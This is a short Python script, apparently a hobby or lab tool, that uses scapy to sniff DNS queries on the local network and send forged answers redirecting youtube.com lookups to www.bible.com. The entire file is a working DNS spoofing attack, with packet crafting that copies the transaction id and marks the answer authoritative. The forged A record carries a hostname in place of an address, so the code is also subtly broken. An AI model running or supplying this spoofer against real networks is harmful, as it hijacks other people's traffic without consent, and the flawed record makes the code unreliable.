from scapy.all import *
import sys

# Define the DNS response function
def dns_response(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qd.qname.decode("utf-8") == 'youtube.com.':
        # Craft the spoofed DNS response
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, 
                          an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="www.bible.com"))
        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent to {packet[IP].src} for {packet[DNS].qd.qname.decode('utf-8')}")

# Sniff DNS query packets and apply the DNS response function
print("Starting DNS spoofing... Press Ctrl+C to stop.")
try:
    sniff(filter="udp port 53", prn=dns_response, store=0)
except KeyboardInterrupt:
    print("DNS spoofing stopped.")
